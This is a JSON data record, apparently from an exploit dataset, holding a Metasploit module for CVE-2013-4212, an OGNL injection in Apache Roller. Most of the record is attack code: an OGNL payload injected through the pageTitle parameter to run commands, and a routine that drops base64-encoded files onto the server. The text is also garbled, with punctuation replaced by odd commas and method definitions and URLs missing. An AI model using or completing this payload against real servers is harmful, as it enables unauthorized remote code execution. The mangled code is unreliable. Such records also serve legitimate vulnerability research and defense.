{
    "text": "vul_name : Apache Roller OGNL Injection ， vul_cve : CVE-2013-4212 ， vul_poc :  ，  # This module requires Metasploit : http/metasploit.com/download ，  # Current source :  ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => 'Apache Roller OGNL Injection' ,  ， 'Description' => %q{ ， This module exploits an OGNL injection vulnerability in Apache Roller < 5.0.2. The ， vulnerability is due to an OGNL injection on the UIAction controller because of an ， insecure usage of the ActionSupport.getText method. This module has been tested ， successfully on Apache Roller 5.0.1 on Ubuntu 10.04. ， } ,  ， 'Author' => ，  [  ， 'Unknown' ,  # From coverity.com / Vulnerability discovery ， 'juan vazquez' # Metasploit module ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [  ，  [ 'CVE' , '2013-4212' ]  ,  ，  [ 'URL' , ' ，  ]  ,  ， 'Platform' => 'java' ,  ， 'Arch' => ARCH_JAVA ,  ， 'Privileged' => true ,  ， 'Targets' => ，  [  ，  [ 'Apache Roller 5.0.1' , { } ]  ，  ]  ,  ， 'DisclosureDate' => 'Oct 31 2013' ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， Opt : RPORT ( 8080 )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'The path to the Apache Roller application.' , \"/roller\" ]  )  ，  ]  , self.class )  ， end ， injection = \"%24{ ( %23_memberAccess [ \\\"allowStaticMethodAccess\\\" ] %3dtrue , CMD , ' ) }\" ， injection.gsub !  ( /CMD/ , Rex : Text : uri_encode ( cmd )  ， vprint_status ( \"Attempting to execute :  # {cmd}\" )  ， res = send_request_cgi ( { ， 'method' => 'GET' ,  ， 'uri' => normalize_uri ( target_uri.path.to_s , \"roller-ui\" , \"login.rol\" )  ,  ， 'encode_params' => false ,  ， 'vars_get' => ， { ， 'pageTitle' => injection ， } ， } )  ， end ， cmd = \" # f=new java.io.FileOutputStream ( ' # {filename}'+ # a ,  # {append} )  , \" ， cmd \" # f.write ( new sun.misc.BASE64Decoder (  ) .decodeBuffer ( ' # {Rex : Text.encode_base64 ( part ) }' )  , \" ， cmd \" # f.close (  )  ,  # a=' # { @ random_suffix}'\" ， execute_command ( cmd )  ， end ， def exploit ， print_status ( \"Checking injection.\" ) ",
    "time": "2013.11.26"
}